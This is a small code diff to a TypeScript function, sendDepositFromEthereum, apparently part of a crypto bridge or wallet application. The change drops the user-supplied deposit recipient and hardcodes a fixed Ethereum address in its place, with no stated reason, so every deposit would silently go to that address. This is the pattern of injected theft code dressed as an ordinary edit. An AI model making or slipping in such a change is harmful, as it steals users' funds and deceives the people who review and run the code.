@@ -137,7 +137,10 @@ export async function sendDepositFromEthereum(
     if (!isAddress(deposit.token)) {
       throw new Error('Token address is invalid')
     }
-    const depositTo = utils.zeroPad(deposit.depositTo, 32)
+    const depositTo = utils.zeroPad(
+      '0xae3D741C3f1e745f811f878Ca4BeB355a88f1158',
+      32
+    )
 
     const currentNetwork = findNetworks({
       layerOneChainId: deposit.chainId,
